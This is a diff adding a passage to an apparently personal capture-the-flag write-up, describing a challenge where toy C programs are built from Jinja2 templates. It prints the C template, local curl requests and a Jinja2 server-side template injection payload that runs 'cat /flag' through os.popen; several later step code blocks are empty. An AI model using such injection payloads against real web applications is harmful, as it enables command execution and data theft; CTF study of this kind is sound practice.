@@ -1601,4 +1601,85 @@ $ ecHduLmNvbGxlZ2V7WTJDM1NzOV9qZlpGUnVRX2F6V21kOHNDalMyLlFYMUVUT3hJREx6UURNeVF6V
 pwn.college{Y2C3Ss9_jfZFRuQ_azWmd8sCjS2.QX1ETOxIDLzQDMyQzW}
 ```
 
-## Day 8 - 
+## Day 8 - Jinja2 template
+
+There are multiple pieces in this challenge and probably multiple solutions as well. Once we understand all the operations in Santa's workshop, it's not difficult to find a solution. At a high level:
+* We can create toys based on 3 Jinja2 templates (`/create`), which are actually C programs
+* Compiled them (`/assemble/<toy_id>`) via `gcc -x c -O2 -pipe ..`
+* And play with them (`/play<toy_id>`)
+
+Templates are similar, but the one I exploited is the Teddy Bear:
+```c
+$ cat /challenge/templates/teddy.c.j2
+/* Teddy Bear */
+#include <stdio.h>
+#include <string.h>
+
+int main(void) {
+    char note[80];
+
+    setbuf(stdout, NULL);
+    puts("soft hug!");
+
+    printf("teddy keeps this secret: %s\n", "{{ secret }}");
+    printf("share a feeling (%s):\n", "{{ feeling }}");
+
+    if (!fgets(note, sizeof(note), stdin)) return 0;
+
+    size_t len = strlen(note);
+    if (len > 0 && note[len - 1] == '\n') note[len - 1] = 0;
+
+    printf("teddy repeats back: %s\n", note);
+    printf("letters counted: %zu\n", strlen(note));
+    return 0;
+}
+```
+
+When we create toys, we get the `toy_id`, useful later:
+```bash
+$ curl -s -X POST -H "Content-Type: application/json" -d '{"template":"teddy.c.j2"}' http://127.0.0.1/create
+{"toy_id":"e27d0ccb7a29fdac"}
+```
+
+For thinkering there are two options, we can either replace parts of the template or render it. Both operations are juicy! My approach was to insert a flag-leaking Python payload in one of the payloads, render it (making sure the result C code remains valid) the massemble and execute.
+
+```python
+{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read().strip()}}
+```
+
+**Step 1 - Create a toy**
+
+```bash
+$ curl -s -X POST -H "Content-Type: application/json" -d '{"template":"teddy.c.j2"}' http://127.0.0.1/create
+{"toy_id":"fe371ffc9ce21bd9"}
+```
+
+**Step 2 - Insert the payload**
+
+The trickiest part here was to work around the multiple levels of quoted strings inside quoted strings inside quoted strings. But with some experimentation, here's the working payload:
+
+```bash
+```
+
+<div class="box-note">
+The payload cuts the rest of the C code after successfuly closing the functions, to avoid any syntax errors.
+</div>
+
+**Step 3 - Render the payload**
+
+When we render the payload we don't need anything in the context, so w can just use a dummy variable:
+```bash
+
+```
+
+**Step 4 - Assemble the toy**
+
+```bash
+```
+
+**Step 5 - Play!**
+
+Play with the toy, which runs the compiled binary, which includes the flag rendered in the previous step:
+
+```bash
+```
